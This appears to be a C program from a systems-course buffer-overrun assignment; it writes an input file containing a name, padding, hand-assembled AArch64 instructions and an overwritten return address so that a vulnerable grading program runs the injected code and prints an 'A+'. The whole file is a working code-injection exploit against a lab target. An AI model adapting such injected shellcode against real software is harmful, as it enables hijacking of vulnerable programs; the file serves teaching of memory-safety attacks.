/* Authors: Rohan Amin and Alex Luo 
   createdataAplus.c */
#include <stdio.h>
#include "miniassembler.h"

int main(void) {
   FILE *psFile;
   int i;
   unsigned int mov, adr, strb, branch, adr2;
   unsigned long movLocation;
   psFile = fopen("dataAplus", "w");
   fputs("Rolex",psFile);
   putc('\0', psFile);
   
   fputs("A+",psFile);
   putc('\0', psFile);

   for (i = 0; i < 15; i++)
      putc('\0', psFile);

   mov = MiniAssembler_mov(1, 's');
   adr = MiniAssembler_adr(0, 0x400961, 0x420074);
   strb = MiniAssembler_strb(1,0);
   fwrite(&mov, sizeof(unsigned int), 1, psFile);
   fwrite(&adr, sizeof(unsigned int), 1, psFile);
   fwrite(&strb, sizeof(unsigned int), 1, psFile);    
   
   /* printf parameters  */
   adr = MiniAssembler_adr(0, 0x400960, 0x42007c);
   adr2 = MiniAssembler_adr(1, 0x42005e, 0x420080);
   branch = MiniAssembler_b(0x400874,0x420084);  
   movLocation = 0x420070; 
      
   fwrite(&adr, sizeof(unsigned int), 1, psFile);
   fwrite(&adr2, sizeof(unsigned int), 1, psFile); 
   fwrite(&branch, sizeof(unsigned int), 1, psFile);
   fwrite (&movLocation, sizeof(unsigned long), 1, psFile);
   fclose(psFile);
   return 0;

}
